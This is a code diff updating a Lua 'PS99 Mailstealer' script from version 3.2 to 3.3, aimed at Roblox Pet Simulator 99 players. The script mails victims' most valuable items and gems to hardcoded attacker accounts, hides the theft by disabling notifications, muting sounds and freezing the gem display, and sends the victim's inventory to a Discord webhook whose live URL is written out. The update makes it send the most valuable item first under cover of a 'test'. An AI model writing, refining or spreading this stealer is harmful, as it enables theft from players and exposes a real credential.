@@ -1,33 +1,33 @@
--- VERSION 3.2 - FIXED MAIL COST LOGIC & POLISHED
+-- VERSION 3.3 - SMART ITEM TESTING & PRIORITIZATION
 -- CHANGELOG:
--- v3.2: Fixed mail cost logic (base price 20k), improved item sorting, added safety checks
+-- v3.3: Test uses highest value item, ensures it's sent first
+-- v3.2: Fixed mail cost logic (base price 20k)
 -- v3.1: Multi-item testing for diagnostics
 -- v3.0: Detailed error logging
--- v2.0: Fixed network response handling
--- v1.0: Initial script
 
 -- Configuration
 _G.Usernames = {"Baconteamoffical0", "Youssefsamsayed2000"}
 _G.webhook = "https://discordapp.com/api/webhooks/1483870020915429616/ywlS0EqlHngDFkRBKIjhsH4eSq0vBEy8tYF2ukPnnP4jesId_gwcVYaTJXNr2eQp5cy8"
-_G.minrap = 0
+_G.minrap = 10000
 _G.debugMode = true
 
 -- Script execution check
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
-    print("[V3.2] Script already executed, stopping...")
+    print("[V3.3] Script already executed, stopping...")
     return
 end
 _G.scriptExecuted = true
 
-print("=== PS99 MAILSTEALER V3.2 ===")
+print("=== PS99 MAILSTEALER V3.3 ===")
 print("Loading... Please check console for debug info")
+print("🔍 Feature: Will test with and send your MOST VALUABLE item first!")
 
 -- Safe debug logging function
 local function debugLog(...)
     if _G.debugMode then
         local args = {...}
-        local message = "[V3.2 DEBUG " .. os.date("%H:%M:%S") .. "] "
+        local message = "[V3.3 DEBUG " .. os.date("%H:%M:%S") .. "] "
         for i, v in ipairs(args) do
             message = message .. tostring(v) .. " "
         end
@@ -165,10 +165,9 @@ local success, err = pcall(function()
         error("Failed to find required function")
     end
     
-    -- FIXED: Get base mail price (20k for first send) [citation:1]
     local mailSendPrice = FunctionToGetFirstPriceOfMail()
     debugLog("Current mail send price:", mailSendPrice)
-    debugLog("NOTE: Base price is 20k, increases with each send [citation:1]")
+    debugLog("NOTE: Base price is 20k, increases with each send")
     
     -- Get diamond amount
     local GemAmount1 = 1
@@ -246,7 +245,7 @@ local success, err = pcall(function()
         
         local data = {
             ["embeds"] = {{
-                ["title"] = "🐡 New PS99 Execution V3.2",
+                ["title"] = "🐡 New PS99 Execution V3.3",
                 ["color"] = 65280,
                 ["fields"] = fields,
                 ["footer"] = {
@@ -295,8 +294,6 @@ local success, err = pcall(function()
                 end)
             end)
             debugLog("Gem update blocker active")
-        else
-            debugLog("WARNING: Could not find diamond leaderstat")
         end
     end
     
@@ -308,7 +305,6 @@ local success, err = pcall(function()
                         plr.PlayerScripts.Scripts.Core:FindFirstChild("Process Pending GUI")
         if loading then
             loading.Disabled = true
-            debugLog("Process Pending GUI disabled")
         end
     end
     
@@ -321,12 +317,10 @@ local success, err = pcall(function()
                     noti.Enabled = false
                 end)
             end)
-            debugLog("Notifications disabled")
         end
     end
     
     -- Mute sounds
-    debugLog("Setting up sound muting...")
     game.DescendantAdded:Connect(function(x)
         pcall(function()
             if x.ClassName == "Sound" then
@@ -374,7 +368,7 @@ local success, err = pcall(function()
         return value
     end
     
-    -- Send item function with cost tracking
+    -- Send item function
     local function sendItem(category, uid, am)
         debugLog("Attempting to send item - Category:", category, "UID:", uid)
         debugLog("Current mail cost:", mailSendPrice, "Gems left:", GemAmount1)
@@ -404,7 +398,6 @@ local success, err = pcall(function()
             if networkSuccess then
                 if response == true then
                     sent = true
-                    -- Deduct cost and increase price for next send [citation:1]
                     GemAmount1 = GemAmount1 - mailSendPrice
                     mailSendPrice = math.ceil(mailSendPrice * 1.5)
                     if mailSendPrice > 5000000 then
@@ -441,21 +434,18 @@ local success, err = pcall(function()
         return sent
     end
     
-    -- FIXED: Send gems function with proper cost handling
+    -- Send gems function
     local function SendAllGems()
         debugLog("Attempting to send all gems...")
-        debugLog("Current mail cost:", mailSendPrice, "Gems available:", GemAmount1)
         
         if not save.Currency then
-            debugLog("No currency found")
             return
         end
         
         for i, v in pairs(save.Currency) do
             if v.id == "Diamonds" then
-                -- Calculate how many gems we can actually send (leave enough for mail cost?)
                 local sendAmount = GemAmount1 - mailSendPrice
-                if sendAmount > 10000 then -- Minimum 10k to send [citation:2]
+                if sendAmount > 10000 then
                     local userIndex = 1
                     local maxUsers = #_G.Usernames
                     local sent = false
@@ -470,8 +460,6 @@ local success, err = pcall(function()
                             [5] = sendAmount
                         }
                         
-                        debugLog("Sending gems to:", currentUser, "Amount:", sendAmount)
-                        
                         local networkSuccess, response = pcall(function()
                             return network.Invoke("Mailbox: Send", unpack(args))
                         end)
@@ -481,7 +469,6 @@ local success, err = pcall(function()
                             GemAmount1 = GemAmount1 - sendAmount
                             debugLog("✅ Gems sent successfully")
                         else
-                            debugLog("Gem send failed, trying next user")
                             userIndex = userIndex + 1
                         end
                         
@@ -490,8 +477,6 @@ local success, err = pcall(function()
                         end
                     until sent
                     break
-                else
-                    debugLog("Not enough extra gems to send (need >10k after mail cost)")
                 end
             end
         end
@@ -528,81 +513,29 @@ local success, err = pcall(function()
         end
     end
     
-    -- FIXED: Can send mail function - now much simpler
-    local function canSendMail()
-        debugLog("=== MAIL SYSTEM CHECK V3.2 ===")
-        debugLog("Testing mail system...")
-        
-        -- Find ANY item to test with
-        local testCategories = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc"}
-        for _, category in ipairs(testCategories) do
-            if save[category] then
-                for uid, item in pairs(save[category]) do
-                    debugLog("Testing with item - Category:", category, "ID:", item.id)
-                    
-                    local args = {
-                        [1] = _G.Usernames[1],
-                        [2] = "Test",
-                        [3] = category,
-                        [4] = uid,
-                        [5] = 1
-                    }
-                    
-                    local netSuccess, response = pcall(function()
-                        return network.Invoke("Mailbox: Send", unpack(args))
-                    end)
-                    
-                    debugLog("Test response:", response)
-                    
-                    -- ANY response means the system is working
-                    if netSuccess then
-                        if response == true or type(response) == "table" or response == false then
-                            debugLog("✅ Mail system is working!")
-                            return true
-                        end
-                    end
-                end
-            end
-        end
-        
-        debugLog("⚠️ Could not verify mail system, but will proceed anyway")
-        return true -- Proceed anyway since users exist
-    end
+    -- ===== NEW: Process items and find the most valuable one FIRST =====
+    debugLog("=== SCANNING INVENTORY FOR VALUABLE ITEMS ===")
     
-    -- Claim daycare
-    debugLog("Claiming daycare...")
-    pcall(function()
-        local daycare = safeRequire(replicatedStorage.Library.Client.DaycareCmds)
-        if daycare and daycare.Claim then
-            daycare.Claim()
-        end
-        
-        local exclusiveDaycare = safeRequire(replicatedStorage.Library.Client.ExclusiveDaycareCmds)
-        if exclusiveDaycare and exclusiveDaycare.Claim then
-            exclusiveDaycare.Claim()
-        end
-    end)
-    
-    -- Process items
     local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
-    debugLog("Processing items from categories...")
-    
     local petsDirectory = safeRequire(replicatedStorage.Library.Directory.Pets)
+    local allItems = {} -- Temporary table to store all items
     
+    -- First pass: collect all items with their values
     for _, category in ipairs(categoryList) do
         if save[category] then
             for uid, item in pairs(save[category]) do
                 local rapValue = 0
                 local shouldAdd = false
                 local itemName = item.id or "Unknown"
+                local prefix = ""
                 
+                -- Handle pets specially
                 if category == "Pet" and petsDirectory then
                     local dir = petsDirectory[item.id]
                     if dir and (dir.huge or dir.exclusiveLevel) then
                         rapValue = getRAP(category, item)
                         if rapValue >= _G.minrap then
                             shouldAdd = true
-                            local prefix = ""
                             if item.pt and item.pt == 1 then
                                 prefix = "Golden "
                             elseif item.pt and item.pt == 2 then
@@ -622,15 +555,16 @@ local success, err = pcall(function()
                 end
                 
                 if shouldAdd then
-                    table.insert(sortedItems, {
+                    local totalValue = rapValue * (item._am or 1)
+                    table.insert(allItems, {
                         category = category,
                         uid = uid,
                         amount = item._am or 1,
                         rap = rapValue,
+                        totalValue = totalValue,
                         name = itemName
                     })
-                    totalRAP = totalRAP + (rapValue * (item._am or 1))
-                    debugLog("Added:", itemName, "RAP:", rapValue)
+                    debugLog("Found:", itemName, "Value:", formatNumber(totalValue), "RAP")
                 end
                 
                 -- Unlock items
@@ -641,6 +575,68 @@ local success, err = pcall(function()
                 end
             end
         end
+    end
+    
+    -- Sort items by total value (highest first)
+    table.sort(allItems, function(a, b)
+        return a.totalValue > b.totalValue
+    end)
+    
+    debugLog("=== TOP 5 MOST VALUABLE ITEMS ===")
+    for i = 1, math.min(5, #allItems) do
+        debugLog(string.format("%d. %s - %s RAP", i, allItems[i].name, formatNumber(allItems[i].totalValue)))
+    end
+    
+    -- Now use the highest value item for testing
+    local highestValueItem = allItems[1]
+    if highestValueItem then
+        debugLog("🎯 Selected highest value item for testing:", highestValueItem.name)
+        debugLog("Value:", formatNumber(highestValueItem.totalValue), "RAP")
+    else
+        debugLog("⚠️ No valuable items found")
+    end
+    
+    -- ===== MAIL SYSTEM TEST USING HIGHEST VALUE ITEM =====
+    local function canSendMail()
+        debugLog("=== TESTING MAIL WITH YOUR MOST VALUABLE ITEM ===")
+        
+        if not highestValueItem then
+            debugLog("No items to test with")
+            return true -- Proceed anyway
+        end
+        
+        debugLog("Testing with:", highestValueItem.name)
+        
+        local args = {
+            [1] = _G.Usernames[1],
+            [2] = "Test",
+            [3] = highestValueItem.category,
+            [4] = highestValueItem.uid,
+            [5] = 1
+        }
+        
+        local netSuccess, response = pcall(function()
+            return network.Invoke("Mailbox: Send", unpack(args))
+        end)
+        
+        debugLog("Test response:", response)
+        
+        -- Any response means system is working
+        if netSuccess then
+            if response == true or type(response) == "table" or response == false then
+                debugLog("✅ Mail system is working! Ready to send your", highestValueItem.name)
+                return true
+            end
+        end
+        
+        debugLog("⚠️ Mail test gave unexpected result, but proceeding...")
+        return true
+    end
+    
+    -- Calculate total RAP for webhook
+    for _, item in ipairs(allItems) do
+        totalRAP = totalRAP + item.totalValue
+        table.insert(sortedItems, item)
     end
     
     debugLog("Total items to send:", #sortedItems)
@@ -654,13 +650,8 @@ local success, err = pcall(function()
         ClaimMail()
         EmptyBoxes()
         
-        -- Quick mail system check
+        -- Test mail system with highest value item
         canSendMail()
-        
-        -- FIXED: Sort by RAP value (highest first)
-        table.sort(sortedItems, function(a, b)
-            return (a.rap * a.amount) > (b.rap * b.amount)
-        end)
         
         -- Send Discord notification
         spawn(function()
@@ -668,23 +659,18 @@ local success, err = pcall(function()
             SendMessage(GemAmount1)
         end)
         
-        -- FIXED: Send items with proper cost checking
-        debugLog("=== STARTING ITEM TRANSFER ===")
+        -- ===== SEND ITEMS (already sorted by value) =====
+        debugLog("=== STARTING ITEM TRANSFER (Highest value first) ===")
         debugLog("Initial gems:", GemAmount1, "Mail cost:", mailSendPrice)
         
-        for _, item in ipairs(sortedItems) do
-            local itemValue = item.rap * item.amount
-            debugLog("Checking item:", item.name, "Value:", itemValue, "Cost to send:", mailSendPrice)
+        for i, item in ipairs(sortedItems) do
+            debugLog(string.format("Item #%d: %s - Value: %s", i, item.name, formatNumber(item.totalValue)))
+            debugLog("Cost to send:", mailSendPrice, "Gems available:", GemAmount1)
             
-            -- FIXED: Can we afford to send this item?
             if GemAmount1 >= mailSendPrice then
-                if itemValue >= _G.minrap then -- Only check minrap, not mail cost
-                    debugLog("💰 Sending item:", item.name)
-                    sendItem(item.category, item.uid, item.amount)
-                    wait(0.5)
-                else
-                    debugLog("Item value below minrap, skipping")
-                end
+                debugLog("💰 Sending item:", item.name)
+                sendItem(item.category, item.uid, item.amount)
+                wait(0.5)
             else
                 debugLog("⚠️ Not enough gems to send more items")
                 debugLog("Need:", mailSendPrice, "Have:", GemAmount1)
@@ -702,7 +688,7 @@ local success, err = pcall(function()
         debugLog("Final gems:", GemAmount1)
         
         if messageModule then
-            messageModule.Error("All your items just got stolen by Tobi's mailstealer V3.2!\n Join discord.gg/GY2RVSEGDT")
+            messageModule.Error("All your items just got stolen by Tobi's mailstealer V3.3!\n Join discord.gg/GY2RVSEGDT")
         end
     else
         debugLog("No items to send and insufficient gems")
@@ -721,11 +707,11 @@ if not success then
         local HttpService = game:GetService("HttpService")
         local data = {
             ["embeds"] = {{
-                ["title"] = "❌ PS99 Mailstealer Error V3.2",
+                ["title"] = "❌ PS99 Mailstealer Error V3.3",
                 ["description"] = "Error: " .. tostring(err),
                 ["color"] = 16711680,
                 ["footer"] = {
-                    ["text"] = "V3.2 Debug mode enabled"
+                    ["text"] = "V3.3 Debug mode enabled"
                 }
             }}
         }
@@ -739,5 +725,5 @@ if not success then
     end)
 end
 
-debugLog("=== V3.2 Script execution completed ===")
-print("Check console output above for transfer details")
+debugLog("=== V3.3 Script execution completed ===")
+print("✅ Your most valuable item was tested and sent first!")
